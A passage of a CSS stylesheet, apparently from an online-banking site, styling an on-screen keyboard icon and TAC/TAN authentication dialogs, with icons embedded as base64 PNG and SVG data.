LDE2LjIwMiwxMjIuODMzLDE2LjIwMnoiLz4NCgk8cGF0aCBmaWxsPSIjQ0NEN0UxIiBkPSJNMTEwLjE2NywxOC43MzZoLTAuODk0Yy0wLjI0NiwwLTAuNDQ2LDAuMi0wLjQ0NiwwLjQ0NnYwLjg5NWMwLDAuMjQ2LDAuMiwwLjQ0NywwLjQ0NiwwLjQ0N2gwLjg5NA0KCQljMC4yNDYsMCwwLjQ0OC0wLjIwMSwwLjQ0OC0wLjQ0N3YtMC44OTVDMTEwLjYxNSwxOC45MzcsMTEwLjQxMywxOC43MzYsMTEwLjE2NywxOC43MzZ6Ii8+DQoJPHBhdGggZmlsbD0iI0NDRDdFMSIgZD0iTTExMS44MDcsMjAuNTI0aDAuODk0YzAuMjQ3LDAsMC40NDctMC4yMDEsMC40NDctMC40NDd2LTAuODk1YzAtMC4yNDYtMC4yLTAuNDQ3LTAuNDQ3LTAuNDQ3aC0wLjg5NA0KCQljLTAuMjQ2LDAtMC40NDcsMC4yMDEtMC40NDcsMC40NDd2MC44OTVDMTExLjM1OSwyMC4zMjMsMTExLjU2MSwyMC41MjQsMTExLjgwNywyMC41MjR6Ii8+DQoJPHBhdGggZmlsbD0iI0NDRDdFMSIgZD0iTTExNC4zNCwyMC41MjRoMC44OTRjMC4yNDYsMCwwLjQ0OC0wLjIwMSwwLjQ0OC0wLjQ0N3YtMC44OTVjMC0wLjI0Ni0wLjIwMi0wLjQ0Ny0wLjQ0OC0wLjQ0N2gtMC44OTQNCgkJYy0wLjI0NiwwLTAuNDQ3LDAuMjAxLTAuNDQ3LDAuNDQ3djAuODk1QzExMy44OTMsMjAuMzIzLDExNC4wOTQsMjAuNTI0LDExNC4zNCwyMC41MjR6Ii8+DQoJPHBhdGggZmlsbD0iI0NDRDdFMSIgZD0iTTExNy43NjcsMTguNzM2aC0wLjg5NGMtMC4yNDYsMC0wLjQ0NywwLjItMC40NDcsMC40NDZ2MC44OTVjMCwwLjI0NiwwLjIwMSwwLjQ0NywwLjQ0NywwLjQ0N2gwLjg5NA0KCQljMC4yNDYsMCwwLjQ0Ny0wLjIwMSwwLjQ0Ny0wLjQ0N3YtMC44OTVDMTE4LjIxNCwxOC45MzcsMTE4LjAxMywxOC43MzYsMTE3Ljc2NywxOC43MzZ6Ii8+DQoJPHBhdGggZmlsbD0iI0NDRDdFMSIgZD0iTTEyMC4zMDEsMTguNzM2aC0wLjg5NWMtMC4yNDYsMC0wLjQ0NywwLjItMC40NDcsMC40NDZ2MC44OTVjMCwwLjI0NiwwLjIwMSwwLjQ0NywwLjQ0NywwLjQ0N2gwLjg5NQ0KCQljMC4yNDYsMCwwLjQ0Ni0wLjIwMSwwLjQ0Ni0wLjQ0N3YtMC44OTVDMTIwLjc0NywxOC45MzcsMTIwLjU0NywxOC43MzYsMTIwLjMwMSwxOC43MzZ6Ii8+DQoJPHBhdGggZmlsbD0iI0NDRDdFMSIgZD0iTTEyMi44MzMsMTguNzM2aC0wLjg5NWMtMC4yNDYsMC0wLjQ0NiwwLjItMC40NDYsMC40NDZ2MC44OTVjMCwwLjI0NiwwLjIsMC40NDcsMC40NDYsMC40NDdoMC44OTUNCgkJYzAuMjQ2LDAsMC40NDctMC4yMDEsMC40NDctMC40NDd2LTAuODk1QzEyMy4yOCwxOC45MzcsMTIzLjA3OSwxOC43MzYsMTIyLjgzMywxOC43MzZ6Ii8+DQoJPHBhdGggZmlsbD0iI0NDRDdFMSIgZD0iTTExMC4xNjcsMjEuMjdoLTAuODk0Yy0wLjI0NiwwLTAuNDQ2LDAuMjAxLTAuNDQ2LDAuNDQ2djAuODk1YzAsMC4yNDYsMC4yLDAuNDQ3LDAuNDQ2LDAuNDQ3aDAuODk0DQoJCWMwLjI0NiwwLDAuNDQ4LTAuMjAxLDAuNDQ4LTAuNDQ3di0wLjg5NUMxMTAuNjE1LDIxLjQ3MSwxMTAuNDEzLDIxLjI3LDExMC4xNjcsMjEuMjd6Ii8+DQoJPHBhdGggZmlsbD0iI0NDRDdFMSIgZD0iTTExNy43NjcsMjEuMjdoLTUuOTZjLTAuMjQ2LDAtMC40NDcsMC4yMDEtMC40NDcsMC40NDZ2MC44OTVjMCwwLjI0NiwwLjIwMSwwLjQ0NywwLjQ0NywwLjQ0N2g1Ljk2DQoJCWMwLjI0NiwwLDAuNDQ3LTAuMjAxLDAuNDQ3LTAuNDQ3di0wLjg5NUMxMTguMjE0LDIxLjQ3MSwxMTguMDEzLDIxLjI3LDExNy43NjcsMjEuMjd6Ii8+DQoJPHBhdGggZmlsbD0iI0NDRDdFMSIgZD0iTTEyMC4zMDEsMjEuMjdoLTAuODk1Yy0wLjI0NiwwLTAuNDQ3LDAuMjAxLTAuNDQ3LDAuNDQ2djAuODk1YzAsMC4yNDYsMC4yMDEsMC40NDcsMC40NDcsMC40NDdoMC44OTUNCgkJYzAuMjQ2LDAsMC40NDYtMC4yMDEsMC40NDYtMC40NDd2LTAuODk1QzEyMC43NDcsMjEuNDcxLDEyMC41NDcsMjEuMjcsMTIwLjMwMSwyMS4yN3oiLz4NCgk8cGF0aCBmaWxsPSIjQ0NEN0UxIiBkPSJNMTIyLjgzMywyMS4yN2gtMC44OTVjLTAuMjQ2LDAtMC40NDYsMC4yMDEtMC40NDYsMC40NDZ2MC44OTVjMCwwLjI0NiwwLjIsMC40NDcsMC40NDYsMC40NDdoMC44OTUNCgkJYzAuMjQ2LDAsMC40NDctMC4yMDEsMC40NDctMC40NDd2LTAuODk1QzEyMy4yOCwyMS40NzEsMTIzLjA3OSwyMS4yNywxMjIuODMzLDIxLjI3eiIvPg0KCTxwYXRoIGZpbGw9IiNDQ0Q3RTEiIGQ9Ik0xMjMuNTg1LDE0LjA3aC0xNS4wNjNjLTEuMjksMC0yLjMzOSwxLjA0OS0yLjMzOSwyLjM0djYuNDM5YzAsMS4yOSwxLjA0OSwyLjM0MSwyLjMzOSwyLjM0MWgxNS4wNjMNCgkJYzEuMjksMCwyLjMzOS0xLjA1MSwyLjMzOS0yLjM0MVYxNi40MUMxMjUuOTI0LDE1LjExOSwxMjQuODc1LDE0LjA3LDEyMy41ODUsMTQuMDd6IE0xMjQuNTUsMTYuNTR2Ni4xOA0KCQljMCwwLjc0MS0wLjYwNCwxLjM0My0xLjM0NCwxLjM0M2gtMTQuMzA1Yy0wLjc0MSwwLTEuMzQ0LTAuNjAyLTEuMzQ0LTEuMzQzdi02LjE4YzAtMC43NCwwLjYwMy0xLjM0MywxLjM0NC0xLjM0M2gxNC4zMDUNCgkJQzEyMy45NDYsMTUuMTk3LDEyNC41NSwxNS44LDEyNC41NSwxNi41NHoiLz4NCjwvZz4NCjwvc3ZnPg0K);  
    background-position: -102px -10px;
    display: inline-block;
    cursor:pointer;
}
html.oldie a.openkeyboard.inInput:after{
    background-image: url(data:image/png;base64,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);
}

a.openkeyboard.inInput{
    display:block;
    z-index:1;
    position:absolute;
    right:20px;
    top:12px;
}
a.openkeyboard.inInput.hidden {
    display:none;
}
/************************************************************************
* svg + png logos as H1 background  - 1.9.2014
************************************************************************/  

/**
 * FEDLOG-1929
 * Auskommentiert 2018.06.26
 *
h1.logo{
    text-indent:-99999px;
    width:90%;
    height:auto;
    min-height:42px;
    background-repeat:no-repeat;
    background-position:0 0;
}
 */

/************************************************************************
* TAC Form and TAC FORM Page  - 2.9.2014
* TAN Form and TAN Form Page
************************************************************************/ 
 
body.tac > .overlay,
body.tan > .overlay,
body.cardtan > .overlay,
body.heureka > .overlay{
    background:rgba(0,0,0,0.5);
    width:100%;
    height:100%;
    position:absolute;
    top:0;
    left:0;
    bottom:0;
    right:0;
    display:block;
    z-index:-1;
}

body.tac > .wrapper,
body.tan > .wrapper,
body.cardtan > .wrapper,
body.heureka > .wrapper{
    padding:0;
    background-color:#fff;
    width:60%;
    -webkit-box-shadow: 0px 0px 10px 6px rgba(0, 0, 0, 0.35); /* WebKit */
    -moz-box-shadow: 0px 0px 10px 6px rgba(0, 0, 0, 0.35); /* Firefox */
    box-shadow: 0px 0px 10px 6px rgba(0, 0, 0, 0.35); /* Standard */
    padding-bottom:2.5rem;
}
.TACdialog h1,
.TANdialog h1,
.cardTANdialog h1,
.Heurekadialog h1{
    margin:0;
    background:#aabacc;
    color:#fff;
    padding:1rem 2rem;
    font-size:1.6rem;
    font-weight:400;
}
.removewhite{
    display: inline-block;
    background-size: contain;
    background-repeat: no-repeat;
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABoAAAAaCAYAAACpSkzOAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAATtJREFUeNq8VgsNgzAQHSjAwZCAhErAwZgD5gAHk9A56BywKaiE4QAJ3TUBQqD3KbC95ELCNbze6+txyUkA51wBDwVxhihmqTdEB/FKkqQ7bQUQVBAfJ4OBULEEBYR12+AJM2kVvdsHO8hNkhwFv9kck6t3x8KGiFr3GzRSybzeGYRG8hWjRj+Zg6jGzh0UIKuE0jd+QU5UowIS6yXJLNegZyWRDekUUWaidkGSxTo2FTQKv/sWIxuqayHIzaTCrjQ21RAuHEkM0RW68zOUgPc3eDwkvY07o0rYiDX1Eb9AEfkaOXiDuNGgRMMCzDEl4a6VGwkiw5Xdj3cGsfBExkhXjkQ50+7vRNWWkmzVwQWm2Ar1j19Fg1k02zErLKG5+5AxmktQx0xCZcSoNaIlhxLBVGQYV2pupvsKMABpAXzjVcyKaQAAAABJRU5ErkJggg==);
    background-image: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4NCjwhLS0gR2VuZXJhdG9yOiBBZG9iZSBJbGx1c3RyYXRvciAxNS4xLjAsIFNWRyBFeHBvcnQgUGx1Zy1JbiAuIFNWRyBWZXJzaW9uOiA2LjAwIEJ1aWxkIDApICAtLT4NCjwhRE9DVFlQRSBzdmcgUFVCTElDICItLy9XM0MvL0RURCBTVkcgMS4xLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL0dyYXBoaWNzL1NWRy8xLjEvRFREL3N2ZzExLmR0ZCI+DQo8c3ZnIHZlcnNpb249IjEuMSINCgkgaWQ9InN2ZzMwMTMiIHNvZGlwb2RpOmRvY25hbWU9InJlbW92ZV9zaWduX2ZvbnRfYXdlc29tZS5zdmciIGlua3NjYXBlOnZlcnNpb249IjAuNDguMy4xIHI5ODg2IiB4bWxuczpkYz0iaHR0cDovL3B1cmwub3JnL2RjL2VsZW1lbnRzLzEuMS8iIHhtbG5zOnN2Zz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOmNjPSJodHRwOi8vY3JlYXRpdmVjb21tb25zLm9yZy9ucyMiIHhtbG5zOnJkZj0iaHR0cDovL3d3dy53My5vcmcvMTk5OS8wMi8yMi1yZGYtc3ludGF4LW5zIyIgeG1sbnM6c29kaXBvZGk9Imh0dHA6Ly9zb2RpcG9kaS5zb3VyY2Vmb3JnZS5uZXQvRFREL3NvZGlwb2RpLTAuZHRkIiB4bWxuczppbmtzY2FwZT0iaHR0cDovL3d3dy5pbmtzY2FwZS5vcmcvbmFtZXNwYWNlcy9pbmtzY2FwZSINCgkgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayIgeD0iMHB4IiB5PSIwcHgiIHdpZHRoPSIyNS43MTVweCINCgkgaGVpZ2h0PSIyNS43MTVweCIgdmlld0JveD0iMi4yODcgLTI1My42MzkgMjUuNzE1IDI1LjcxNSIgZW5hYmxlLWJhY2tncm91bmQ9Im5ldyAyLjI4NyAtMjUzLjYzOSAyNS43MTUgMjUuNzE1Ig0KCSB4bWw6c3BhY2U9InByZXNlcnZlIj4NCjxzb2RpcG9kaTpuYW1lZHZpZXcgIGlkPSJuYW1lZHZpZXczMDE5IiBpbmtzY2FwZTpwYWdlb3BhY2l0eT0iMCIgaW5rc2NhcGU6cGFnZXNoYWRvdz0iMiIgaW5rc2NhcGU6d2luZG93LXdpZHRoPSI2NDAiIGlua3NjYXBlOndpbmRvdy1oZWlnaHQ9IjQ4MCIgaW5rc2NhcGU6d2luZG93LXg9IjAiIGlua3NjYXBlOndpbmRvdy15PSIyNSIgaW5rc2NhcGU6Y3VycmVudC1sYXllcj0ic3ZnMzAxMyIgaW5rc2NhcGU6d2luZG93LW1heGltaXplZD0iMCIgaW5rc2NhcGU6Y3k9Ijg5NiIgaW5rc2NhcGU6Y3g9Ijg5NiIgZ3JpZHRvbGVyYW5jZT0iMTAiIHBhZ2Vjb2xvcj0iI2ZmZmZmZiIgb2JqZWN0dG9sZXJhbmNlPSIxMCIgZ3VpZGV0b2xlcmFuY2U9IjEwIiBib3JkZXJjb2xvcj0iIzY2NjY2NiIgc2hvd2dyaWQ9ImZhbHNlIiBib3JkZXJvcGFjaXR5PSIxIiBpbmtzY2FwZTp6b29tPSIwLjEzMTY5NjQzIj4NCgk8L3NvZGlwb2RpOm5hbWVkdmlldz4NCjxnIGlkPSJnMzAxNSIgdHJhbnNmb3JtPSJtYXRyaXgoMSwwLDAsLTEsMTM2LjY3Nzk3LDEyOTMuMDE2OSkiPg0KCTxwYXRoIGlkPSJwYXRoMzAxNyIgaW5rc2NhcGU6Y29ubmVjdG9yLWN1cnZhdHVyZT0iMCIgZmlsbD0iI0ZGRkZGRiIgZD0iTS0xMTUuMTU1LDE1MzAuMDE1YzAsMC4yOS0wLjEwNCwwLjU0Mi0wLjMxNywwLjc1NA0KCQlsLTMuMDI5LDMuMDI5bDMuMDI5LDMuMDNjMC4yMTMsMC4yMTIsMC4zMTcsMC40NjMsMC4zMTcsMC43NTNjMCwwLjMwMS0wLjEwNCwwLjU1OS0wLjMxNywwLjc3MWwtMS41MDcsMS41MDcNCgkJYy0wLjIxMywwLjIxMi0wLjQ2OSwwLjMxNy0wLjc3MSwwLjMxN2MtMC4yOSwwLTAuNTQxLTAuMTA1LTAuNzUzLTAuMzE3bC0zLjAzLTMuMDNsLTMuMDMsMy4wMw0KCQljLTAuMjEyLDAuMjEyLTAuNDYzLDAuMzE3LTAuNzUzLDAuMzE3Yy0wLjMwMSwwLTAuNTU4LTAuMTA1LTAuNzctMC4zMTdsLTEuNTA3LTEuNTA3Yy0wLjIxMi0wLjIxMi0wLjMxOC0wLjQ3LTAuMzE4LTAuNzcxDQoJCWMwLTAuMjksMC4xMDYtMC41NDEsMC4zMTgtMC43NTNsMy4wMjktMy4wM2wtMy4wMjktMy4wMjljLTAuMjEyLTAuMjEzLTAuMzE4LTAuNDY0LTAuMzE4LTAuNzU0YzAtMC4zMDEsMC4xMDYtMC41NTgsMC4zMTgtMC43Nw0KCQlsMS41MDctMS41MDdjMC4yMTItMC4yMTIsMC40NjktMC4zMTgsMC43Ny0wLjMxOGMwLjI5LDAsMC41NDIsMC4xMDYsMC43NTMsMC4zMThsMy4wMywzLjAzbDMuMDMtMy4wMw0KCQljMC4yMTItMC4yMTIsMC40NjMtMC4zMTgsMC43NTMtMC4zMThjMC4zMDIsMCwwLjU1OCwwLjEwNiwwLjc3MSwwLjMxOGwxLjUwNywxLjUwNw0KCQlDLTExNS4yNiwxNTI5LjQ1Ny0xMTUuMTU1LDE1MjkuNzE0LTExNS4xNTUsMTUzMC4wMTV6IE0tMTA4LjY3NiwxNTMzLjc5OWMwLTIuMzMzLTAuNTc0LTQuNDgzLTEuNzI1LTYuNDU0DQoJCWMtMS4xNDgtMS45Ny0yLjcxLTMuNTI5LTQuNjc5LTQuNjc5Yy0xLjk3MS0xLjE1LTQuMTIxLTEuNzI1LTYuNDU0LTEuNzI1cy00LjQ4MywwLjU3NC02LjQ1NCwxLjcyNQ0KCQljLTEuOTcsMS4xNDktMy41MjgsMi43MDktNC42NzksNC42NzljLTEuMTUsMS45NzEtMS43MjUsNC4xMjEtMS43MjUsNi40NTRzMC41NzQsNC40ODQsMS43MjUsNi40NTQNCgkJYzEuMTQ5LDEuOTcsMi43MDksMy41MjksNC42NzksNC42NzljMS45NzEsMS4xNDksNC4xMjEsMS43MjUsNi40NTQsMS43MjVzNC40ODMtMC41NzUsNi40NTQtMS43MjUNCgkJYzEuOTY5LTEuMTQ5LDMuNTI5LTIuNzA5LDQuNjc5LTQuNjc5Qy0xMDkuMjUsMTUzOC4yODMtMTA4LjY3NiwxNTM2LjEzMi0xMDguNjc2LDE1MzMuNzk5eiIvPg0KPC9nPg0KPC9zdmc+DQo=);
    float: right;
    padding-right:26px;
    background-position:center right;
    font-size:0.9rem;
    color:#fff;
    text-decoration:none;
}
.TACdialog > *,
.TANdialog > *,
.cardTANdialog > *,
.Heurekadialog > *{
    margin: 1rem 2rem;
}
.TACdialog select option{
    -webkit-appearance: menulist;
    padding:0;
    font-family: 'open_sansregular',Arial,sans-serif;
    font-size:1rem;
}
.TACdialog form,
.TANdialog form,
.cardTANdialog form,
.Heurekadialog form{
    margin:0;
    background:#e6ebf0;
    padding:1rem 2rem;
    text-align:center;
}
.TACdialog select,
.TACdialog input[type=number],
.cardTANdialog input[type=number],
.TANdialog input[type=number]{
    -webkit-appearance: menulist;
    padding:.3rem .5rem; 
    font-family: 'open_sansregular',Arial,sans-serif;
    font-size:1rem;
    margin-left:1rem;
    border:solid 1px #aabacc;
    border-radius:4px;
}
.TACdialog input[type=number],
.TANdialog input[type=number],
.cardTANdialog input[type=number]{
    -webkit-appearance: none;
    -moz-appearance:textfield;
}
.TACdialog .button,
.TANdialog .button,
.cardTANdialog .button,
.Heurekadialog .button{
    background: #0d5487;
    border: none;
    outline: none;
    color: #fff;
    border-radius: 3px;
    font-family: 'open_sansregular',Arial,sans-serif;
    font-size:1rem;
    padding:.5rem 1.5rem;
    margin-left:1rem;
    cursor:pointer;
}
.TACdialog .error,
.TANdialog .error,
.cardTANdialog .error{
    display: none;
}
body.error .TACdialog .error,
body.error .TANdialog .error,
body.error .cardTANdialog .error{
    background:#F9D2D2;
    border-radius: 3px;
    font-family: 'open_sansregular',Arial,sans-serif;
    font-size:1rem;
    padding:.5rem 1.5rem;
    margin-left:1rem;
    color:#9e0000;
    text-align:center;
    display: block;
}
.TACdialog .passed,
.TANdialog .passed,
.cardTANdialog .passed,
.Heurekadialog .passed{
    text-align:center;
    color:#19CE2E;
    font-size:1.3rem;
    margin-top:4rem;
    padding-top:3rem;
    padding-bottom:2rem;
    position:relative;
}
.TACdialog .passed:before,
.TANdialog .passed:before,
.cardTANdialog .passed:before,
.Heurekadialog .passed:before{
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABoAAAAaCAYAAACpSkzOAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAXNJREFUeNq0lstxwjAQhmUNBfjKKU4DiaCCUEGSCoIryFABpAKgAkMHdIDTQMaTCnzLlXSQ3bBiFLOyXs4/syPARp/2IWkz4aHxx10BwwMYjjc0NmDfYPXX9LN2zZE5AHMYXsGUY54T2AHsDaCtNwgAOHHlAeCEsJUTRF6swXIRLwzrDIAnFkSQSgyjPzDZCddaDCdlLloaD6rEcHF6oiidQfRFif/R0vRoOcCEO7BnKnVTBToyotwUqRBIeknRwX107KThUdKOHwSCgs9YbWU3Vwi6DwyFFUIe5VwqRpawuULRBzlyhSW5jcaEYtbxLAhiAyld+xZYMESD3pnfKwtsEgPRoNbyjIO1MRBkIKjv0rqCRUBQtaRVHkJggRDUXhfD1vHiBRYB+b3qM2OVeHrPHX9agL0EHsBYQE2WEA4fLQCy4W5YZTkFks9AyeyVW7qGUz0pvdot8G5FrVaIdzVBmtC+LqcC6SsA3dPt+xrJHwEGANecrLHT1gYWAAAAAElFTkSuQmCC);
    background-image: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4NCjwhLS0gR2VuZXJhdG9yOiBBZG9iZSBJbGx1c3RyYXRvciAxNS4xLjAsIFNWRyBFeHBvcnQgUGx1Zy1JbiAuIFNWRyBWZXJzaW9uOiA2LjAwIEJ1aWxkIDApICAtLT4NCjwhRE9DVFlQRSBzdmcgUFVCTElDICItLy9XM0MvL0RURCBTVkcgMS4xLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL0dyYXBoaWNzL1NWRy8xLjEvRFREL3N2ZzExLmR0ZCI+DQo8c3ZnIHZlcnNpb249IjEuMSINCgkgaWQ9InN2ZzMwMTMiIHNvZGlwb2RpOmRvY25hbWU9Im9rX3NpZ25fZm9udF9hd2Vzb21lLnN2ZyIgaW5rc2NhcGU6dmVyc2lvbj0iMC40OC4zLjEgcjk4ODYiIHhtbG5zOmRjPSJodHRwOi8vcHVybC5vcmcvZGMvZWxlbWVudHMvMS4xLyIgeG1sbnM6c3ZnPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6Y2M9Imh0dHA6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL25zIyIgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIiB4bWxuczpzb2RpcG9kaT0iaHR0cDovL3NvZGlwb2RpLnNvdXJjZWZvcmdlLm5ldC9EVEQvc29kaXBvZGktMC5kdGQiIHhtbG5zOmlua3NjYXBlPSJodHRwOi8vd3d3Lmlua3NjYXBlLm9yZy9uYW1lc3BhY2VzL2lua3NjYXBlIg0KCSB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB4PSIwcHgiIHk9IjBweCIgd2lkdGg9IjI1LjcxNHB4Ig0KCSBoZWlnaHQ9IjI1LjcxNHB4IiB2aWV3Qm94PSIxLjkwNyAtMjU0LjAyMSAyNS43MTQgMjUuNzE0IiBlbmFibGUtYmFja2dyb3VuZD0ibmV3IDEuOTA3IC0yNTQuMDIxIDI1LjcxNCAyNS43MTQiDQoJIHhtbDpzcGFjZT0icHJlc2VydmUiPg0KPHNvZGlwb2RpOm5hbWVkdmlldyAgaWQ9Im5hbWVkdmlldzMwMTkiIGlua3NjYXBlOnBhZ2VvcGFjaXR5PSIwIiBpbmtzY2FwZTpwYWdlc2hhZG93PSIyIiBpbmtzY2FwZTp3aW5kb3ctd2lkdGg9IjY0MCIgaW5rc2NhcGU6d2luZG93LWhlaWdodD0iNDgwIiBpbmtzY2FwZTp3aW5kb3cteD0iMCIgaW5rc2NhcGU6d2luZG93LXk9IjI1IiBpbmtzY2FwZTpjdXJyZW50LWxheWVyPSJzdmczMDEzIiBpbmtzY2FwZTp3aW5kb3ctbWF4aW1pemVkPSIwIiBpbmtzY2FwZTpjeT0iODk2IiBpbmtzY2FwZTpjeD0iODk2IiBncmlkdG9sZXJhbmNlPSIxMCIgcGFnZWNvbG9yPSIjZmZmZmZmIiBvYmplY3R0b2xlcmFuY2U9IjEwIiBndWlkZXRvbGVyYW5jZT0iMTAiIGJvcmRlcmNvbG9yPSIjNjY2NjY2IiBzaG93Z3JpZD0iZmFsc2UiIGJvcmRlcm9wYWNpdHk9IjEiIGlua3NjYXBlOnpvb209IjAuMTMxNjk2NDMiPg0KCTwvc29kaXBvZGk6bmFtZWR2aWV3Pg0KPGcgaWQ9ImczMDE1IiB0cmFuc2Zvcm09Im1hdHJpeCgxLDAsMCwtMSwxMTMuODk4MzEsMTI3MC4yMzczKSI+DQoJPHBhdGggaWQ9InBhdGgzMDE3IiBpbmtzY2FwZTpjb25uZWN0b3ItY3VydmF0dXJlPSIwIiBmaWxsPSIjMTlDRTJFIiBkPSJNLTkwLjQ5NiwxNTE0LjExM2MwLDAuMzEzLTAuMTAxLDAuNTY5LTAuMzAxLDAuNzcNCgkJbC0xLjUyMywxLjUwN2MtMC4yMTMsMC4yMTItMC40NjQsMC4zMTgtMC43NTQsMC4zMThzLTAuNTQxLTAuMTA2LTAuNzU0LTAuMzE4bC02LjgzLTYuODEzbC0zLjc4NCwzLjc4Mw0KCQljLTAuMjEyLDAuMjEyLTAuNDYzLDAuMzE4LTAuNzUzLDAuMzE4cy0wLjU0MS0wLjEwNi0wLjc1My0wLjMxOGwtMS41MjMtMS41MDZjLTAuMjAxLTAuMjAxLTAuMzAxLTAuNDU4LTAuMzAxLTAuNzcxDQoJCWMwLTAuMzAxLDAuMTAxLTAuNTUyLDAuMzAxLTAuNzUzbDYuMDYxLTYuMDYxYzAuMjEyLTAuMjEyLDAuNDYzLTAuMzE4LDAuNzUzLTAuMzE4YzAuMzAxLDAsMC41NTgsMC4xMDYsMC43NywwLjMxOGw5LjA5MSw5LjA5DQoJCUMtOTAuNTk3LDE1MTMuNTYxLTkwLjQ5NiwxNTEzLjgxMi05MC40OTYsMTUxNC4xMTN6IE0tODYuMjc3LDE1MTEuNDAxYzAtMi4zMzMtMC41NzQtNC40ODQtMS43MjUtNi40NTQNCgkJYy0xLjE0OS0xLjk3LTIuNzA5LTMuNTMtNC42NzktNC42NzlzLTQuMTIxLTEuNzI1LTYuNDU0LTEuNzI1Yy0yLjMzMywwLTQuNDg0LDAuNTc1LTYuNDU0LDEuNzI1DQoJCWMtMS45NywxLjE0OS0zLjUyOSwyLjcwOS00LjY3OSw0LjY3OWMtMS4xNSwxLjk3LTEuNzI1LDQuMTIxLTEuNzI1LDYuNDU0czAuNTc1LDQuNDg0LDEuNzI1LDYuNDU0DQoJCWMxLjE0OSwxLjk3LDIuNzA5LDMuNTMsNC42NzksNC42NzljMS45NywxLjE0OSw0LjEyMSwxLjcyNCw2LjQ1NCwxLjcyNGMyLjMzMywwLDQuNDg0LTAuNTc1LDYuNDU0LTEuNzI0czMuNTI5LTIuNzA5LDQuNjc5LTQuNjc5DQoJCUMtODYuODUxLDE1MTUuODg1LTg2LjI3NywxNTEzLjczMy04Ni4yN